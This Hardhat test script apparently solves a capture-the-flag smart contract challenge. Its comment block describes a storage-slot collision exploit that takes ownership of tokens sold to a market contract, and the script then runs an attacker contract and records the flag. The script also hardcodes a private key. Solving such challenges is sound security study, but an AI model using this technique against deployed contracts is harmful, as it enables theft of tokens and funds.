import { expect } from "chai";
import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { deployOrGetAt, getEoaOrPrivateKey } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let eoaAddress: string;
let attacker: Contract;
let setup: Contract; // setup contract
let tx: any;

before(async () => {
  eoa = await getEoaOrPrivateKey(
    `0x2753d38d7ed30a2d0e74b2c5562eb88fc4f38344f9ff739d7adcaaa308e3a346`
  );
  eoaAddress = await eoa.getAddress();

  setup = await deployOrGetAt(
    `contracts/market/public/contracts/Setup.sol:Setup`,
    `0xD94087028F7cb4167CC3b0F7798F8B45f00bB968`,
    eoa,
    { value: ethers.utils.parseEther(`50`) }
  );
});

/**
@eternal-storage
store[tokenId] = name
store[tokenId + 1] = owner
store[tokenId + 2] = approval
store[tokenId + 3] = metadata

market can mint for anyone, and can write to tokenId, but that's random.
however, we can mint a token ourselves, and set all of its data to owner

Mint token, set approval, metadata to owner:
0: name
1: owner
2: owner
3: owner

sell to market:
0: name
1: market
2: 0x0
3: owner

change name of tokenId + 2, i.e., overwrite tokenId's approval. repeat.
can be done by directly calling eternal storage
passes ensureTokenOwner check because (tokenId+2) + 1 = tokenId's metadata

0: name
1: market
2: owner
3: owner
*/

it("solves the challenge", async function () {
  const attackerFactory = await ethers.getContractFactory(
    `MarketAttacker`,
    eoa
  );
  attacker = await attackerFactory.deploy(setup.address);

  tx = await attacker.attack({ value: ethers.utils.parseEther(`4000`) });
  await tx.wait();

  // PCTF{CRyPt0_Nam3_53rv1c3}
});
